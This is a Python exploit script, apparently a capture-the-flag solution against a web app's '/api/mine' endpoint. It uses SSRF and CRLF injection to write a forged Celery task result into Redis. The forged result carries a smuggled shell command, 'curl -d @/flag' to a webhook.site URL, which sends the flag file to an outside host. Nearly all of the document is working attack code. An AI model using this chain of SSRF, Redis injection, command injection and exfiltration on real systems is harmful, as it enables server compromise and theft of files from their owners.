#!/usr/bin/env python3
import json
import time
import uuid
import requests
import sys


hack_tmpl = json.loads('''
{
  "status": "FAILURE",
  "result": {
    "exc_type": "InvalidHostException",
    "exc_message": [
      "localhost"
    ],
    "exc_module": "app.miner"
  },
  "traceback": "",
  "children": [],
  "date_done": "2023-09-28T21:31:49.749340",
  "task_id": ""
}
''')

sploit_uuid = str(uuid.uuid4())
hack_tmpl['task_id'] = sploit_uuid
hack_tmpl['result']['exc_message'][0] = f"localhost; curl -d @/flag https://webhook.site/73b29784-532b-40c6-954f-905e3ecedc68 "
pld = json.dumps(hack_tmpl)
print("PAYLOAD:")
print(pld)

celery_key = f'celery-task-meta-{sploit_uuid}'
mine_pld = {'url': 'http://localhost:6379',
            'version': [f"\r\nSET {celery_key} '{pld}'\r\n", "1"]}

URL = sys.argv[1]
r = requests.post(f'{URL}/api/mine', json=mine_pld)
out = r.json()
print("MINE TASK ID:")
print(out)
# Wait until the celery task will be executed.
time.sleep(5)

task_id = out['task_id']
r = requests.get(f'{URL}/api/mine/{task_id}')
print("MINE TASK RESULT:")
print(r.text)

r = requests.get(f'{URL}/api/mine/{sploit_uuid}')
print("EXPLOIT RESULT:")
print(r.text)

